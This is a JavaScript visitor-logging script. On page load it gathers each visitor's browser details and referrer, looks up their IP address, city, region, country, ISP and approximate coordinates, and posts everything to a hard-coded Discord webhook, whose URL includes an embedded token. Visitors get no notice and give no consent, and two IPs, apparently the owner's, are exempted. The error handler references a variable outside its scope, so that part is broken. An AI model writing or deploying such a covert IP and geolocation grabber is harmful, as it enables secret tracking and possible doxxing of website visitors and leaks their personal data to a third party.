// Replace this with your Discord webhook URL
const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1440057894216401057/dL-kBKOWvi8JNT-n1YsgvGOshn_rcUPx5BJzsVDU4X314e17r0QsmqEQKXwUVTZOT22r';

// List of IPs to block from sending data
const BLOCKED_IPS = ['92.29.204.199', '77.100.219.194'];

// Function to send data to Discord webhook
async function sendToDiscord(data) {
  try {
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        content: null,
        embeds: [
          {
            title: 'New Website Visitor',
            color: 0x00ff00, // Green color
            fields: Object.entries(data).map(([name, value]) => ({
              name,
              value: value.toString() || 'N/A',
              inline: true,
            })),
            timestamp: new Date().toISOString(),
          },
        ],
      }),
    });

    if (!response.ok) {
      console.error('Failed to send data to Discord:', response.statusText);
    }
  } catch (error) {
    console.error('Error sending to Discord:', error);
  }
}

// Function to collect visitor information
async function collectVisitorInfo() {
  try {
    // Basic client-side information
    const visitorData = {
      'User Agent': navigator.userAgent,
      Referrer: document.referrer || 'Direct',
      'Page URL': window.location.href,
      Timestamp: new Date().toLocaleString(),
    };

    // Fetch IP and geolocation data using ipapi.co
    const ipResponse = await fetch('https://ipapi.co/json/');
    const ipData = await ipResponse.json();

    // Check if the IP is in the blocked list
    const visitorIP = ipData.ip || 'Unknown';
    if (BLOCKED_IPS.includes(visitorIP)) {
      console.log('Visitor IP is blocked, skipping Discord webhook.');
      return; // Exit the function without sending data
    }

    // Add IP and geolocation data to visitorData
    visitorData.IP = visitorIP;
    visitorData.City = ipData.city || 'Unknown';
    visitorData.Region = ipData.region || 'Unknown';
    visitorData.Country = ipData.country_name || 'Unknown';
    visitorData.ISP = ipData.org || 'Unknown';
    visitorData.Latitude = ipData.latitude || 'N/A';
    visitorData.Longitude = ipData.longitude || 'N/A';

    // Send collected data to Discord
    await sendToDiscord(visitorData);
  } catch (error) {
    console.error('Error collecting visitor info:', error);
    // Optionally send error info to Discord (unless IP is blocked)
    if (!BLOCKED_IPS.includes(visitorData.IP)) {
      await sendToDiscord({
        Error: 'Failed to collect visitor info',
        Details: error.message,
      });
    }
  }
}

// Run the function when the page loads
window.addEventListener('load', collectVisitorInfo);
